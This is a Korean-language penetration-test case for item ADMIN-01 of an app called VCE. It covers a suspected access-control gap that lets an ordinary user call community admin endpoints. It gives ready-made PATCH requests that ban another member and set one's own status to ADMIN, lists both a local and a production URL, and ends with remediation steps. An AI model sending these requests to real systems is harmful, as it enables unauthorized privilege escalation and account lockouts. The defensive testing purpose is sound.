================================================================================
[VCE-ADMIN-01] 커뮤니티 Admin API RBAC 우회 → 일반 사용자 권한 상승
도메인: admin (관리자)
================================================================================

## 1. 진단 항목 개요

- **항목명**: /api/community/admin/** 경로 접근 제어 누락
- **번호**: ADMIN-01
- **위험도**: Critical
- **OWASP**: A01:2021 – Broken Access Control

## 2. 대상 기능 & 엔드포인트

| 항목 | 내용 |
|------|------|
| 로컬 | http://localhost:8080/api/community/admin/members/{id}/status |
| 운영 | https://vceapp.com/api/community/admin/members/{id}/status |
| HTTP 메서드 | PATCH |
| 인증 요건 | 인증된 사용자 (ADMIN 역할 검증 누락 가능) |

## 3. 취약점 원리 (Why this works)

SecurityConfig에서 `/api/admin/**`은 `hasRole("ADMIN")`으로 보호된다.
그러나 `/api/community/admin/...` 경로는 `/api/community/**` 패턴으로 매칭되어
다른 권한 규칙이 적용될 수 있다.

`CommunityController.java:104-111`:
```java
@PatchMapping("/admin/members/{memberId}/status")
public ResponseEntity<Map<String, String>> updateMemberStatus(
    @PathVariable Long memberId,
    @RequestBody MemberStatusRequestDto request,
    @AuthenticationPrincipal UserDetails userDetails)  // 권한 확인 없음
```

`@AuthenticationPrincipal`이 있지만 ADMIN 역할 확인 로직이 없으면
모든 인증된 사용자가 회원 상태 변경(차단/해제) 가능하다.

## 4. 테스트 절차 (Step-by-step)

### [사전 준비]
1. test@vce.com (일반 USER) 로그인 → JWT 획득
2. 다른 사용자 memberId 확인 (예: 2)

---

### Step 1. 일반 사용자 JWT로 회원 상태 변경

```
PATCH /api/community/admin/members/2/status HTTP/1.1
Host: localhost:8080
Authorization: Bearer <일반사용자_JWT>
Content-Type: application/json

{
  "status": "BANNED"
}
```

---

### Step 2. 자기 자신의 상태 변경

```
PATCH /api/community/admin/members/1/status HTTP/1.1
Host: localhost:8080
Authorization: Bearer <JWT>
Content-Type: application/json

{
  "status": "ADMIN"
}
```

---

### Step 3. 다양한 상태값 시도

```json
{"status": "ADMIN"}
{"status": "ACTIVE"}
{"status": "BANNED"}
{"status": "WITHDRAWN"}
{"role": "ADMIN"}
```

---

### Step 4. /api/admin/** vs /api/community/admin/** 비교

```
# 보호된 경로
PATCH /api/admin/members/2/status HTTP/1.1
Authorization: Bearer <일반사용자_JWT>
→ 예상: HTTP 403

# 취약 가능 경로
PATCH /api/community/admin/members/2/status HTTP/1.1
Authorization: Bearer <일반사용자_JWT>
→ 확인: HTTP 200이면 취약
```

## 5. 취약 여부 판단 기준

✅ **취약 (Vulnerable)**:
- 일반 사용자 JWT로 PATCH → HTTP 200 + 상태 변경 성공
- 타 사용자 계정 차단 가능

✗ **안전 (Not Vulnerable)**:
- HTTP 403: "관리자 권한이 필요합니다"
- 메서드에 `@PreAuthorize("hasRole('ADMIN')")` 적용됨

## 6. 예상 취약 포인트 (코드 위치)

- `CommunityController.java:104-111` — @PatchMapping("/admin/members/{memberId}/status")에 권한 검증 없음
- `SecurityConfig.java` — /api/community/admin/** 경로에 대한 별도 hasRole 설정 없음

## 7. 권고 조치

- SecurityConfig에 명시적 규칙 추가:
  ```java
  .requestMatchers("/api/community/admin/**").hasRole("ADMIN")
  ```
- CommunityController의 admin 메서드에 `@PreAuthorize("hasRole('ADMIN')")` 추가
- 관리자 기능을 AdminController로 이동하여 경로 통합
